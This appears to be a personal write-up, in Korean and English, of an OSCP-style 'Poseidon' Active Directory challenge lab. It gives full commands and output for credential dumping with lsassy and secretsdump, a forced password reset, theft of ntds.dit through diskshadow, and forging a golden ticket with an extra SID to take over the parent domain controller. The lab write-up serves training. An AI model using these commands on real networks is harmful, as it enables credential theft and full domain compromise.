---
tags:
  - type/machine
  - platform/pwk-challenge
  - status/solved
  - tech/ad/asreproast
  - tech/ad/dcsync
  - tech/ad/bloodhound
  - tech/ad/ticket-forge
  - tech/win/seimpersonate
  - tech/win/sebackup
  - tech/win/autologon
  - tech/web/lfi-rfi
  - tech/svc/smb
  - tech/exec/winrm
  - tech/exec/psexec
type: machine
platform: pwk-challenge
status: solved
tech_count: 11
---
About this lab

The Poseidon lab showcases Active Directory attacks leveraging ASREPRoasting and SeImpersonate privilege escalation. Learners will extract an AS_REP hash, crack it for credentials, and gain initial access to the target. Privilege escalation through abuse of SeImpersonate permissions demonstrates how attackers can exploit system-level access. Post-exploitation involves dumping credentials from memory, preparing for lateral movement.

Lab Description

The Poseidon lab offers an immersive, hands-on experience in exploiting Active Directory environments, ideal for security professionals seeking to deepen their offensive security skills. This lab guides learners through the process of identifying and attacking accounts vulnerable to ASREPRoasting—a common authentication-based attack vector. Participants will extract and crack AS_REP hashes to gain valid credentials and initial access to the target system via Windows Remote Management.

Once inside, learners will exploit SeImpersonate privileges to escalate privileges and achieve SYSTEM-level access. The lab concludes with post-exploitation techniques, including credential dumping from memory to prepare for lateral movement across the network.

This lab is suited for penetration testers, red teamers, and advanced security enthusiasts aiming to strengthen their understanding of Windows privilege escalation and credential access techniques. Participants will build practical skills in Active Directory enumeration, hash cracking, privilege escalation, and post-exploitation—all critical for real-world offensive engagements.

Learning Objectives

After completing this lab, learners will be able to:
- Perform Active Directory enumeration and identify accounts vulnerable to ASREPRoasting.
- Crack the extracted AS_REP hash to obtain valid credentials.
- Establish an initial foothold on the gyoza target using Windows Remote Management.
- Exploit SeImpersonate privileges to elevate to the SYSTEM user.
- Extract stored credentials from memory for further attacks or lateral movement.


##### 

Objectives

We have been tasked to conduct a penetration test on the network of _poseidon.xyz_. Several vulnerabilities and misconfigurations are present on the Active Directory environment, which can be leveraged by an attacker to gain access to all workstations. The main objective is obtain access to the Domain Controller.

The public subnet of the network resides in the `192.168.xx.0/24` range, where the `xx` of the third octet can be found under the _IP ADDRESS_ field in the control panel.

Although this Challenge Lab is not a mock exam, it has been setup to use the 'Assumed Breach' scenario as seen in the OSCP+ exam. The credentials below can be used to commence your attack: Username: Eric.Wallows Password: EricLikesRunning800



이 연구실에 대하여

포세이돈 랩은 ASREPRoasting 및 SeImpersonate 권한 상승을 활용한 Active Directory 공격을 보여줍니다. 학습자는 AS_REP 해시를 추출하고, 이를 해독하여 자격 증명을 확보하고, 대상 시스템에 대한 초기 접근 권한을 얻습니다. SeImpersonate 권한 악용을 통한 권한 상승은 공격자가 시스템 수준 접근 권한을 어떻게 악용할 수 있는지 보여줍니다. 공격 후에는 메모리에서 자격 증명을 추출하고, 측면 이동을 준비합니다.

포세이돈 랩은 Active Directory 환경을 공격하는 데 필요한 몰입형 실습 환경을 제공하여 공격적인 보안 기술을 심화하고자 하는 보안 전문가에게 이상적입니다. 이 랩에서는 학습자가 일반적인 인증 기반 공격 벡터인 ASREPRoasting에 취약한 계정을 식별하고 공격하는 과정을 안내합니다. 참가자는 AS_REP 해시를 추출하고 크랙하여 유효한 자격 증명을 획득하고 Windows 원격 관리를 통해 대상 시스템에 초기 액세스 권한을 얻습니다.

접속 후, 학습자는 SeImpersonate 권한을 악용하여 권한을 상승시키고 SYSTEM 레벨 접근 권한을 획득하게 됩니다. 실습은 네트워크 전반에 걸친 횡적 이동을 준비하기 위해 메모리에서 자격 증명을 추출하는 등의 사후 공격 기법으로 마무리됩니다.

이 실습은 Windows 권한 상승 및 자격 증명 접근 기술에 대한 이해를 강화하고자 하는 침투 테스터, 레드 팀원 및 고급 보안 전문가에게 적합합니다. 참가자들은 실제 공격 활동에 필수적인 Active Directory 열거, 해시 크래킹, 권한 상승 및 사후 공격에 대한 실질적인 기술을 습득하게 됩니다.

## 이 실습을 완료하면 학습자는 다음을 수행할 수 있게 됩니다.

- Active Directory 열거를 수행하고 ASREPRoasting 취약점에 취약한 계정을 식별합니다.
- 추출된 AS_REP 해시를 해독하여 유효한 자격 증명을 얻으세요.
- Windows 원격 관리를 사용하여 교자 대상에 대한 초기 접근 권한을 확보하십시오.
- SeImpersonate 권한을 악용하여 SYSTEM 사용자로 권한을 상승시키십시오.
- 추가 공격이나 측면 이동을 위해 메모리에 저장된 자격 증명을 추출합니다.

**192.168.123.161**

챌린지8 - VM 1 OS 자격 증명:

```
No credentials were provided for this machine
```

**192.168.123.162**

챌린지8 - VM 2 OS 자격 증명:

```
No credentials were provided for this machine
```

**192.168.123.163**

챌린지8 - VM 3 OS 자격 증명:

```
Eric.Wallows / EricLikesRunning800
```

##### 

목표

_저희는 poseidon.xyz_ 네트워크에 대한 침투 테스트를 수행해야 하는 임무를 맡았습니다 . Active Directory 환경에는 여러 취약점과 잘못된 구성이 존재하며, 공격자는 이를 악용하여 모든 워크스테이션에 접근할 수 있습니다. 주요 목표는 도메인 컨트롤러에 접근하는 것입니다.

네트워크의 공용 서브넷은 제어판의 _IP 주소_ 필드 에서 세 번째 옥텟의 `192.168.xx.0/24`값을 확인할 수 있는 범위 내에 있습니다.`xx`

이 챌린지 랩은 모의고사는 아니지만, OSCP+ 시험에서 볼 수 있는 '보안 침해 가정' 시나리오를 사용하도록 구성되어 있습니다. 아래 자격 증명을 사용하여 공격을 시작할 수 있습니다. 사용자 이름: Eric.Wallows 비밀번호: EricLikesRunning800

# Proof of Concept

## Information Gathering

### Nmap

![[Pasted image 20260117125214.png]]

![[Pasted image 20260117125652.png]]

![[Pasted image 20260117135202.png]]
### Host Discovery



### Hosts file setting
![[Pasted image 20260117130806.png]]
## 192.168.123.163 - GYOZA

af579c2b794d52e31309d6408783c1c6

`Eric.Wallows / EricLikesRunning800`

### Initial Access

winrm 접속

![[Pasted image 20260117142705.png]]

### Privilege Escalation
권한 확인
- SeImpersonatePrivilege 보유
![[Pasted image 20260117172159.png]]

![[Pasted image 20260117170323.png]]


관리자 권한으로 리버스쉘 연결 성공

![[Pasted image 20260117170416.png]]


관리자 권한으로 리버스쉘 연결 성공

Retrieve local.txt
![[Pasted image 20260117172632.png]]
![[Pasted image 20260117172856.png]]


![[Pasted image 20260117173128.png]]




### Post-Exploitation

nxc lsassy 모듈

- lisa / LisaWayToGo456
```bash
nxc smb 192.168.123.163 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
```
![[Pasted image 20260117184916.png]]


$Password = ConvertTo-SecureString "LisaWayToGo456" -AsPlainText -Force
Set-LocalUser -Name "lisa" -Password $Password




`┌──(kali🎃kali)-[~/oscp]└─$ nxc smb 192.168.170.163 -u 'eric.wallows' -p 'EricLikesRunning800' -M lsassySMB         192.168.170.163 445    GYOZA            [*] Windows 10 / Server 2019 Build 19041 x64 (name:GYOZA) (domain:sub.poseidon.yzx) (signing:False) (SMBv1:False)SMB         192.168.170.163 445    GYOZA            [+] sub.poseidon.yzx\eric.wallows:EricLikesRunning800 (Pwn3d!)LSASSY      192.168.170.163 445    GYOZA            sub\lisa 905ae9b4d957545fb7b9ea0c4333247bLSASSY      192.168.170.163 445    GYOZA            sub\lisa LisaWayToGo456LSASSY      192.168.170.163 445    GYOZA            SUB.POSEIDON.YZX\lisa LisaWayToGo456`

impacket-secretsdump

- lisa / Impossible2Crack4.?

`┌──(kali🎃kali)-[~/oscp]└─$ impacket-secretsdump eric.wallows:EricLikesRunning800@192.168.170.163 -dc-ip 192.168.170.161Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Service RemoteRegistry is in stopped state[*] Service RemoteRegistry is disabled, enabling it[*] Starting service RemoteRegistry[*] Target system bootKey: 0x670e70016a4a08027d1a7657df06cfb6[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)...[*] DefaultPasswordsub.poseidon.yzx\lisa:Impossible2Crack4.?...`

SharpHound 정보 수집

- lisa 계정이 jackie 계정에 대해 AllExtendedRights 권한 보유
    - 강제 패스워드 변경 가능

`PS C:\Users\eric.wallows\Documents> .\sharpHound.exe -c All.\sharpHound.exe -c All2025-12-30T06:23:43.8819131+00:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound2025-12-30T06:23:44.0069271+00:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry2025-12-30T06:23:44.0225436+00:00|INFORMATION|Initializing SharpHound at 6:23 AM on 12/30/20252025-12-30T06:23:44.0381648+00:00|INFORMATION|Resolved current domain to sub.poseidon.yzx2025-12-30T06:23:44.1787945+00:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry2025-12-30T06:23:44.2412888+00:00|INFORMATION|Beginning LDAP search for sub.poseidon.yzx2025-12-30T06:23:44.2412888+00:00|INFORMATION|Collecting AdminSDHolder data for sub.poseidon.yzx2025-12-30T06:23:44.2881655+00:00|INFORMATION|AdminSDHolder ACL hash B169ECAC85D330AEDDF874BF7EEBE759C62A255C calculated for sub.poseidon.yzx.2025-12-30T06:23:44.3819136+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SUB.POSEIDON.YZX2025-12-30T06:23:44.3819136+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SUB.POSEIDON.YZX2025-12-30T06:23:44.4131690+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SUB.POSEIDON.YZX`

## 192.168.170.162 - DC02

### Latereal Movement (GYOZA to DC02)

lisa 계정을 이용해서 jackie 계정 비밀번호를 “1q2w3e4r”로 변경





`┌──(kali🎃kali)-[~/oscp]└─$ net rpc password "jackie" -U "sub.poseidon.yzx/lisa"%"LisaWayToGo456" -S "192.168.170.162"Enter new password for jackie:`

winrm 접속 성공

``┌──(kali🎃kali)-[~/oscp]└─$ evil-winrm -i 192.168.170.162 -u 'jackie' -p '1q2w3e4r' Evil-WinRM shell v3.9 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\jackie\Documents>``

Read local.txt

`*Evil-WinRM* PS C:\Users\jackie\Desktop> type local.txt0d8548e82b5a329607ceb10cfded0945*Evil-WinRM* PS C:\Users\jackie\Desktop> ipconfig Windows IP Configuration Ethernet adapter Ethernet1:    Connection-specific DNS Suffix  . :   IPv4 Address. . . . . . . . . . . : 192.168.170.162   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.170.254 Tunnel adapter isatap.{8FABB686-864E-49E3-B767-1756BE5D5A72}:    Media State . . . . . . . . . . . : Media disconnected   Connection-specific DNS Suffix  . :` 

### Privilege Escalation

- SeRestorePrivilege 권한 존재

`*Evil-WinRM* PS C:\Users\jackie\Desktop> whoami /priv PRIVILEGES INFORMATION---------------------- Privilege Name                Description                    State============================= ============================== =======SeMachineAccountPrivilege     Add workstations to domain     EnabledSeBackupPrivilege             Back up files and directories  EnabledSeRestorePrivilege            Restore files and directories  EnabledSeShutdownPrivilege           Shut down the system           EnabledSeChangeNotifyPrivilege       Bypass traverse checking       EnabledSeIncreaseWorkingSetPrivilege Increase a process working set Enabled`

Create a file and set instructions to copy C:\ drive into E: drive with an alias.

`*Evil-WinRM* PS C:\Users\jackie\Desktop> type ine.txtset verbose onXset metadata C:\Windows\Temp\meta.cabXset context clientaccessibleXset context persistentXbegin backupXadd volume C: alias ineXcreateXexpose %ine% E:Xend backupX`

Run the diskshadow with script file using /s option

`*Evil-WinRM* PS C:\Users\jackie\Desktop> diskshadow /s ine.txtMicrosoft DiskShadow version 1.0Copyright (C) 2013 Microsoft CorporationOn computer:  DC02,  12/30/2025 8:46:55 AM -> set verbose on-> set metadata C:\Windows\Temp\meta.cabThe existing file will be overwritten.-> set context clientaccessible-> set context persistent-> begin backup-> add volume C: alias ine-> create COM call "lvssObject4->GetRootAndLogicalPrefixPaths" failed.Excluding writer "Shadow Copy Optimization Writer", because all of its components have been excluded.Component "\BCD\BCD" from writer "ASR Writer" is excluded from backupbecause it requires a volume that cannot be found on this system. * Including writer "Task Scheduler Writer":        + Adding component: \TasksStore * Including writer "VSS Metadata Store Writer":        + Adding component: \WriterMetadataStore * Including writer "Performance Counters Writer":        + Adding component: \PerformanceCounters * Including writer "System Writer":        + Adding component: \System Files        + Adding component: \Win32 Services Files * Including writer "ASR Writer":        + Adding component: \ASR\ASR        + Adding component: \Volumes\Volume{bc265d6e-c516-4c80-b881-4e8c9eae5940}        + Adding component: \Volumes\Volume{f8e00104-0004-4492-ba85-66d76199f92e}        + Adding component: \Disks\harddisk0` 

copy ntds.dit into the current working directory using robocopy.

`*Evil-WinRM* PS C:\Users\jackie\Desktop> robocopy /b e:\windows\ntds . ntds.dit -------------------------------------------------------------------------------   ROBOCOPY     ::     Robust File Copy for Windows-------------------------------------------------------------------------------   Started : Tuesday, December 30, 2025 8:47:59 AM   Source : e:\windows\ntds\     Dest : C:\Users\jackie\Desktop\     Files : ntds.dit   Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30 ------------------------------------------------------------------------------                            1    e:\windows\ntds\            New File              24.0 m        ntds.dit  0.0%  0.2%  0.5%  0.7%  1.0%  1.3%  1.5%  1.8%...100% ------------------------------------------------------------------------------                Total    Copied   Skipped  Mismatch    FAILED    Extras    Dirs :         1         0         1         0         0         0   Files :         1         1         0         0         0         0   Bytes :   24.00 m   24.00 m         0         0         0         0   Times :   0:00:00   0:00:00                       0:00:00   0:00:00    Speed :           181049093 Bytes/sec.   Speed :           10359.712 MegaBytes/min.   Ended : Tuesday, December 30, 2025 8:47:59 AM`

Save reg system file to extract the hashes

`*Evil-WinRM* PS C:\Users\jackie\Desktop> reg save hklm\system systemThe operation completed successfully`

Donloaded system, ntds.dit system files

`*Evil-WinRM* PS C:\Users\jackie\Desktop> download ntds.dit Info: Downloading C:\Users\jackie\Desktop\ntds.dit to ntds.dit Info: Download successful!*Evil-WinRM* PS C:\Users\jackie\Desktop> download system Info: Downloading C:\Users\jackie\Desktop\ntds.dit to system Info: Download successful!`

impacket-secretsdump

- Administrator NTLM hash
    - 3bcdd818f7ec942ac91aa30d8db71927

`┌──(kali🎃kali)-[~/oscp]└─$ impacket-secretsdump -system system -ntds ntds.dit localImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x6147911c9221199f60a625e5011aafde[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)[*] Searching for pekList, be patient[*] PEK # 0 found and decrypted: 510cae62a7d31edc77934766cf32f0ac[*] Reading and decrypting hashes from ntds.ditAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3bcdd818f7ec942ac91aa30d8db71927:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DC02$:1000:aad3b435b51404eeaad3b435b51404ee:92d9c96980ab389994f4ffda906fe102:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:80f23a248d39b8cb93df3a4a2f4199a1:::POSEIDON$:1103:aad3b435b51404eeaad3b435b51404ee:01196f308a81e26264eb41dbb4b3e668:::sub.poseidon.yzx\chen:1104:aad3b435b51404eeaad3b435b51404ee:c4ddb64252adfc9e0558353099ded495:::`

administrator NTLM 해시로 winrm 접속 성공

``┌──(kali🎃kali)-[~/oscp]└─$ evil-winrm -i 192.168.170.162 -u 'administrator' -H '3bcdd818f7ec942ac91aa30d8db71927' Evil-WinRM shell v3.9 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\Users\Administrator\Documents>``

Read proof.txt

`*Evil-WinRM* PS C:\Users\Administrator\Desktop> type proof.txtd31712374af31e61049be74b57066767*Evil-WinRM* PS C:\Users\Administrator\Desktop> ipconfig Windows IP Configuration Ethernet adapter Ethernet1:    Connection-specific DNS Suffix  . :   IPv4 Address. . . . . . . . . . . : 192.168.170.162   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.170.254 Tunnel adapter isatap.{8FABB686-864E-49E3-B767-1756BE5D5A72}:    Media State . . . . . . . . . . . : Media disconnected   Connection-specific DNS Suffix  . :`

## 192.168.170.161 - DC01

### Lateral Movement (DC02 to DC01)

eric.wallows 계정이 DC02에 관리자 권한으로 접근 가능하도록 설정

`C:\Windows\system32> nltest /domain_trusts /vList of domain trusts:    0: POSEIDON poseidon.yzx (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )       Dom Guid: b77f9b23-9f53-4afc-a027-b38929b466f0       Dom Sid: S-1-5-21-1190331060-1711709193-932631991    1: sub sub.poseidon.yzx (NT 5) (Forest: 0) (Primary Domain) (Native)       Dom Guid: 5cdf1d22-5e08-4243-b8b1-32651fe49630       Dom Sid: S-1-5-21-4168247447-1722543658-2110108262The command completed successfully`

도메인 SID 추출

- DC01: S-1-5-21-1190331060-1711709193-932631991
- DC02: S-1-5-21-4168247447-1722543658-2110108262

`C:\Windows\system32> nltest /domain_trusts /vList of domain trusts:    0: POSEIDON poseidon.yzx (NT 5) (Forest Tree Root) (Direct Outbound) (Direct Inbound) ( Attr: withinforest )       Dom Guid: b77f9b23-9f53-4afc-a027-b38929b466f0       Dom Sid: S-1-5-21-1190331060-1711709193-932631991    1: sub sub.poseidon.yzx (NT 5) (Forest: 0) (Primary Domain) (Native)       Dom Guid: 5cdf1d22-5e08-4243-b8b1-32651fe49630       Dom Sid: S-1-5-21-4168247447-1722543658-2110108262The command completed successfully`

krbtgt NTLM 해시 추출

- krbtgt:502:aad3b435b51404eeaad3b435b51404ee:80f23a248d39b8cb93df3a4a2f4199a1:::
- krbtgt:aes256-cts-hmac-sha1-96:b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2

`┌──(kali🎃kali)-[~/oscp]└─$ impacket-secretsdump eric.wallows:EricLikesRunning800@192.168.170.162Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Target system bootKey: 0x6147911c9221199f60a625e5011aafde[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)Administrator:500:aad3b435b51404eeaad3b435b51404ee:8fea81a19d172de0c445c8072b9a1697:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::...[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)[*] Using the DRSUAPI method to get NTDS.DIT secretsAdministrator:500:aad3b435b51404eeaad3b435b51404ee:3bcdd818f7ec942ac91aa30d8db71927:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::krbtgt:502:aad3b435b51404eeaad3b435b51404ee:80f23a248d39b8cb93df3a4a2f4199a1:::DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::...[*] Kerberos keys grabbedAdministrator:aes256-cts-hmac-sha1-96:e2786e98a3205f9085ef7071d992422f735ce704f4ba5c29f65f25beed348228Administrator:aes128-cts-hmac-sha1-96:b6593732b7ab7cecd59afadef15b4315Administrator:des-cbc-md5:e0e03d58a15d315ekrbtgt:aes256-cts-hmac-sha1-96:b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2krbtgt:aes128-cts-hmac-sha1-96:b5d83edef61d3c3799047e208e13b2c7krbtgt:des-cbc-md5:b95ee5a11c10d989`

ticketer.py -nthash KRBTGTHASH -domain CHILDFQDN -domain-sid CHILDDOMAINSID -extra-sid PARENTDOMAINSID- hacker

`┌──(kali🎃kali)-[~/oscp]└─$ impacket-ticketer -nthash 80f23a248d39b8cb93df3a4a2f4199a1 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991 AdministratorImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Creating basic skeleton ticket and PAC Infos[*] Customizing ticket for sub.poseidon.yzx/Administrator[*]     PAC_LOGON_INFO[*]     PAC_CLIENT_INFO_TYPE[*]     EncTicketPart[*]     EncAsRepPart[*] Signing/Encrypting final ticket[*]     PAC_SERVER_CHECKSUM[*]     PAC_PRIVSVR_CHECKSUM[*]     EncTicketPart[*]     EncASRepPart[*] Saving ticket in Administrator.ccache`

알아낸 정보를 바탕으로 골든티켓을 생성

`┌──(kali🎃kali)-[~/oscp]└─$ impacket-ticketer -aesKey b2304e451b53dc5e71c08ddd0fd06a3803d8f14243020fd46c80ad44ec75d2a2 -domain sub.poseidon.yzx -domain-sid S-1-5-21-4168247447-1722543658-2110108262 -extra-sid S-1-5-21-1190331060-1711709193-932631991-519 AdministratorImpacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies [*] Creating basic skeleton ticket and PAC Infos[*] Customizing ticket for sub.poseidon.yzx/Administrator[*]     PAC_LOGON_INFO[*]     PAC_CLIENT_INFO_TYPE[*]     EncTicketPart[*]     EncAsRepPart[*] Signing/Encrypting final ticket[*]     PAC_SERVER_CHECKSUM[*]     PAC_PRIVSVR_CHECKSUM[*]     EncTicketPart[*]     EncASRepPart[*] Saving ticket in Administrator.ccache`

티켓 로드

`┌──(kali🎃kali)-[~/oscp]└─$ export KRB5CCNAME=Administrator.ccache`                    

티켓을 사용하여 DC01 접속

`┌──(kali🎃kali)-[~/oscp]└─$ psexec.py sub.poseidon.yzx/Administrator@DC01.poseidon.yzx -k -no-pass/home/kali/.local/share/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.  import pkg_resourcesImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on DC01.poseidon.yzx.....[*] Found writable share ADMIN$[*] Uploading file SOimhbgj.exe[*] Opening SVCManager on DC01.poseidon.yzx.....[*] Creating service zoel on DC01.poseidon.yzx.....[*] Starting service zoel.....[!] Press help for extra shell commandsMicrosoft Windows [Version 10.0.14393](c) 2016 Microsoft Corporation. All rights reserved. C:\Windows\system32>`

Read proof.txt

`C:\Users\Administrator\Desktop> type proof.txte2de23eaf5a0b47f1d49bc7df2ed0247 C:\Users\Administrator\Desktop> ipconfig Windows IP Configuration Ethernet adapter Ethernet0 2:    Connection-specific DNS Suffix  . :    IPv4 Address. . . . . . . . . . . : 192.168.170.161   Subnet Mask . . . . . . . . . . . : 255.255.255.0   Default Gateway . . . . . . . . . : 192.168.170.254 Tunnel adapter Reusable ISATAP Interface {3A609699-C2B5-4DB1-A8C3-D06AE78AA003}:    Media State . . . . . . . . . . . : Media disconnected   Connection-specific DNS Suffix  . :`